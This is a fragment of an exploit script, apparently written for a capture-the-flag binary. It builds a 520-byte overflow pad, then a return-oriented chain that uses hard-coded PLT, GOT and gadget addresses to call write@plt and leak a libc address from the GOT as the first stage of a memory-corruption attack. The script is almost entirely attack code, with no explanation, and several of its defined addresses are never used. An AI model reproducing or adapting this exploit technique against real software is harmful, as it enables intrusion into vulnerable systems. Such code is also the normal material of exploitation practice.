# [0x08049590]> woO 0x41314341
# 520                         

pad = "A" * 520
readplt = 0x08049330
writeplt = 0x080493c0
writegot = 0x080510fc
p3r = 0x0804d66d
writeaddr = 0x08051140
leaveret = 0x0804d302
popebp = 0x0804d66f
got = 0x8050ff8

boob = 0xb00b1351

leak = [writeplt, p3r, 1, writegot, 4].pack("V*")

stage1 =  pad
stage1 << leak

print "A B C " + stage1
